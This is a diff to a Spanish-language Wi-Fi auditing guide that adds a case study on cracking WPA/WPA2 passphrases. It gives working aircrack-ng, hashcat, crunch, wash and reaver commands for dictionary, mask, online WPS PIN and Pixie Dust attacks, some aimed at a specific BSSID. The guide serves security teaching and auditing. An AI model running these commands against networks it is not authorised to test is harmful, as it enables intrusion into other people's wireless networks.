@@ -142,13 +142,42 @@ flowchart LR
   hcxpcapngtool -o hash.22000 -E essidlist pmkid.pcapng
   ```
 
-#### 3. Auditoría de Contraseñas Offline:
-```bash
-# Con Aircrack-ng:
-aircrack-ng -w /usr/share/wordlists/rockyou.txt captura.cap
-# Con Hashcat (Modo 22000 WPA-PBKDF2-PMKID/EAPOL acelerado por GPU):
-hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
-```
+#### 3. Caso de Estudio: Auditoría de Contraseñas por Fuerza Bruta y Diccionario
+El descifrado de WPA/WPA2 no ataca el algoritmo de cifrado simétrico (AES-CCMP), sino la debilidad de la contraseña humana mediante ataques de fuerza bruta en dos modalidades:
+
+##### A. Fuerza Bruta Offline (Post-Captura Handshake / PMKID):
+* **Costo Computacional:** La función `PBKDF2` exige 4,096 iteraciones de HMAC-SHA1 por cada intento. Un procesador (CPU) procesa apenas ~2,000 a 8,000 claves/segundo, mientras que una tarjeta gráfica moderna (GPU) alcanza cientos de miles o millones de combinaciones por segundo.
+* **Técnica 1 — Ataque de Diccionario con Mutación de Reglas:**
+  ```bash
+  # Ataque con Aircrack-ng (CPU):
+  aircrack-ng -w /usr/share/wordlists/rockyou.txt captura.cap
+
+  # Ataque con Hashcat (GPU) aplicando reglas Best64:
+  hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+  ```
+* **Técnica 2 — Ataque por Máscara (Patrones de ISP / Routers por Defecto):**
+  Si el router utiliza contraseñas por defecto de 8 a 10 dígitos numéricos o alfanuméricos:
+  ```bash
+  # Fuerza bruta a 8 dígitos numéricos exactos (00000000 a 99999999):
+  hashcat -m 22000 hash.22000 -a 3 ?d?d?d?d?d?d?d?d
+
+  # Generación al vuelo mediante tubería con Crunch (sin ocupar espacio en disco):
+  crunch 8 8 0123456789 | aircrack-ng -w - -b 84:D3:43:51:32:18 captura.cap
+  ```
+
+##### B. Fuerza Bruta Online: Vulnerabilidad en WPS (Wi-Fi Protected Setup)
+* **El Fallo del PIN WPS:** El estándar WPS permite conectar dispositivos mediante un PIN de 8 dígitos ($10^8 = 100,000,000$ posibilidades). Sin embargo, el protocolo valida los primeros 4 dígitos ($10^4 = 10,000$) y los últimos 3 más checksum ($10^3 = 1,000$) por separado. Esto reduce el espacio de búsqueda a **solo 11,000 combinaciones posibles**, descifrable en pocas horas:
+  ```bash
+  # Escaneo de APs con WPS activo y desbloqueado:
+  sudo wash -i wlx00c0ca97bdaa
+
+  # Fuerza bruta online al PIN WPS con Reaver:
+  sudo reaver -i wlx00c0ca97bdaa -b 84:D3:43:51:32:18 -vv -d 2
+  ```
+* **Ataque Pixie Dust (WPS Offline):** En chipsets vulnerables (Ralink, Realtek, Broadcom), la generación de los números aleatorios `E-S1` y `E-S2` en el intercambio WPS carece de entropía suficiente. La herramienta `pixiewps` permite descifrar el PIN en **menos de 5 segundos de forma offline**:
+  ```bash
+  sudo reaver -i wlx00c0ca97bdaa -b 84:D3:43:51:32:18 -K 1 -vv
+  ```
 
 ---
 
